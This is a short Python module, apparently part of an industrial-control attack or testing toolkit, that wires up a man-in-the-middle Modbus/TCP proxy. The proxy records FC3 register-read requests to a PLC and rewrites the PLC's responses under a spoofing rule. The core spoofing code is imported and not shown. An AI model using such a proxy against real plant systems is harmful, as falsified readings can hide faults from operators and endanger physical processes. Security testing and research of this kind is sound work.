# injector/attacks/modbus_proxy_spoof.py

import logging
import threading
from typing import Optional

from injector.core.config import PlcConfig
from injector.modbus_proxy.proxy import run_tcp_proxy, StreamHooks
from injector.modbus_proxy.state import ConnState
from injector.modbus_proxy.rules import RangeOffsetRule, SpoofRule
from injector.modbus_proxy.spoof_fc3 import record_fc3_request, spoof_fc3_response

log = logging.getLogger(__name__)


def run_modbus_proxy(
    cfg: PlcConfig,
    stop_event: threading.Event,
    listen_host: Optional[str] = None,
    listen_port: Optional[int] = None,
    ready_event: Optional[threading.Event] = None,
    rule: Optional[SpoofRule] = None,
):
    """
    Attack adapter: Modbus/TCP proxy that spoofs FC3 responses based on a rule.
    """
    rule = rule or RangeOffsetRule()
    state = ConnState()

    def tap_request(frame: bytes) -> None:
        record_fc3_request(state, frame)

    def hook_response(frame: bytes) -> bytes:
        return spoof_fc3_response(cfg, state, frame, rule)

    run_tcp_proxy(
        listen_host=listen_host or cfg.proxy_host,
        listen_port=listen_port or cfg.proxy_port,
        plc_host=cfg.plc_host,
        plc_port=cfg.plc_port,
        stop_event=stop_event,
        ready_event=ready_event,
        client_to_plc=StreamHooks(tap=tap_request, hook=None),
        plc_to_client=StreamHooks(tap=None, hook=hook_response),
    )
